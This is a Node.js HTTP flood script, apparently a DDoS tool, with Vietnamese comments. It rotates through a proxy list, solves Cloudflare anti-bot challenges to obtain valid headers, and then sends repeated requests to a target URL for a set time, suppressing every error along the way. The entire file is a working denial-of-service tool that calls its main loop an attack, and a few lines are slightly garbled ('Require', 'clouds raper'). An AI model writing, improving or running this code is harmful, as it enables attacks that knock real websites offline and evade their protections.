Require('events').EventEmitter.defaultMaxListeners = 0;
const fs = require('fs'),
    CloudScraper = require('clouds raper'), 
    path = require('path');


if (process.argv.length !== 6) {
    console.log(`
Usage: node ${path.basename(__filename)} <url> <time> <req_per_ip> <proxies>
Usage: node ${path.basename(__filename)} <http://example.com> <60> <100> <http.txt>`);
    process.exit(0);
}

const target = process.argv[2],
    time = process.argv[3],
    req_per_ip = process.argv[4];

let proxies = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/gi, '').split('\n').filter(Boolean);

// VỊ TRÍ 1: HÀM ASYNC/AWAIT MỚI ĐỂ LẤY HEADERS (CẦN ĐẶT Ở NGOÀI send_req)
let getHeaders = async function () {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    try {
        const response = await CloudScraper({
            uri: target,
            resolveWithFullResponse: true,
            proxy: 'http://' + proxy,
            challengesToSolve: 10
        });

        // Trả về headers (giống như Promise cũ)
        return response.request.headers; 

    } catch (error) {
        // Xử lý lỗi (xóa proxy bị lỗi)
        let obj_v = proxies.indexOf(proxy);
        if (obj_v !== -1) {
            proxies.splice(obj_v, 1);
        }
        console.log(error.message);
        
        throw error;
    }
};

// VỊ TRÍ 2: HÀM ASYNC/AWAIT MỚI ĐỂ GỬI YÊU CẦU
async function send_req() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];

    try {
        // 1. Chờ lấy headers an toàn
        // (Sử dụng 'headers' thay vì 'result' để tránh nhầm lẫn)
        const headers = await getHeaders(); 
        
        // 2. Vòng lặp tấn công (thay thế khối for/callback cũ)
        
        for (let i = 0; i < req_per_ip; ++i) {
            try {
                // Sử dụng await để gửi yêu cầu mạng an toàn
                await CloudScraper({
                    uri: target,
                    headers: headers, // Sử dụng headers đã lấy từ getHeaders
                    proxy: 'http://' + proxy,
                    followAllRedirects: false
                });
            } catch (error) {
                // Xử lý lỗi từng request trong vòng lặp
                console.log(error.message);
            }
        }

    } catch (error) {
        // Lỗi từ getHeaders đã được xử lý (xóa proxy)
    }
}

setInterval(() => {
    send_req();
});

setTimeout(() => {
    console.log('Attack ended.');
    process.exit(0)
}, time * 1000);

// to avoid errors
process.on('uncaughtException', function (err) {
    // console.log(err);
});
process.on('unhandledRejection', function (err) {
    // console.log(err);
});
